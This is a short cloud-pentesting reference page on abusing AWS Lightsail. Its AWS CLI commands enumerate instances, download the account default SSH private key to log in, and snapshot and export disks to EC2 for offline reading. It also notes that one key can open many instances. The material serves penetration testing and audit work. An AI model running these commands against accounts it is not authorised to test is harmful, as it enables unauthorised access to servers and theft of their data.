---
title: "Lightsail: instances and snapshots outside IAM visibility"
description: "Abusing Lightsail instances, keys, and snapshots that sit outside the main VPC and IAM visibility."
keywords:
  - Lightsail
  - instance
  - SSH key
  - snapshot
  - VPS
---

# Lightsail

Lightsail is AWS's simplified VPS product. It runs instances, databases, and snapshots in a parallel plane that teams forget to audit, with its own key management and no instance-profile role. That blind spot is the point: Lightsail resources are often missing from the organization's VPC and IAM review, and the service hands out default SSH keys and lets you snapshot and export disks.

## Enumerating and taking over

```bash
aws lightsail get-instances --query 'instances[].{n:name,ip:publicIpAddress}'

# Download the account default key pair and SSH in
aws lightsail download-default-key-pair --query privateKeyBase64 --output text | base64 -d > key.pem
chmod 600 key.pem ; ssh -i key.pem ec2-user@<public-ip>

# Snapshot a disk to read it, or export a snapshot to EC2
aws lightsail create-instance-snapshot --instance-name <n> --instance-snapshot-name s
aws lightsail export-snapshot --source-snapshot-name s
```

## Exploitation notes

- The account default key pair opens every instance that was launched with it, so one download can be broad access.
- Exporting a Lightsail snapshot moves it into EC2 as an AMI or EBS snapshot, where it can be mounted and read offline.
- Lightsail databases hold their own credentials and are reachable on public endpoints when opened, independent of VPC controls.

## Tools

- **AWS CLI** (`lightsail get-instances`, `download-default-key-pair`, `export-snapshot`).

## References

- [AWS: Lightsail key pairs](https://docs.aws.amazon.com/lightsail/latest/userguide/understanding-public-key-based-ssh-keys-in-amazon-lightsail.html)
- [HackTricks Cloud: AWS services](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/index.html)
